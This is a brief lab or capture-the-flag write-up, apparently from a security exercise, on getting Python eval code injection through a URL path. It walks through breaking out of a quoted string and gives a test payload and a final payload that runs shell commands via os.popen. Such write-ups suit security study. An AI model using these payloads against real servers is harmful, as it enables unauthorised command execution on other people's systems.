### Code Execution 05

- The objective of this challenge is to get a code execution by eval function in python

- first i inject double-quote " to break out the string 
- and the server response with **Internal Server Error**

- so i try inject `/hello/hacker"%2bstr(True)%2b"test` and it response with true
- last payload is `/hello/hacker"%2bstr(os.popen('[CMD]').read())%2b"test`
